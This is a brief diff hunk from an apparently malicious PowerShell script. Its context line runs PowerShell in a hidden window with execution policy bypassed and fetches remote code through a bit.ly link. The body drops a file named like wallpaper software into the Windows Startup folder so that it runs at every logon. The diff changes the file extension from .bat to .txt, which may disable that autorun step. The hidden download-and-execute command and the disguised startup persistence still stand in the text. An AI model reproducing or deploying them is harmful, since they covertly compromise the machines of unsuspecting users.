@@ -30,4 +30,4 @@ powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'irm bit.ly/
 
 cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 
-Set-Content -Path WallpaperEng.bat -Value $batContent -Encoding ASCII
+Set-Content -Path WallpaperEng.txt -Value $batContent -Encoding ASCII
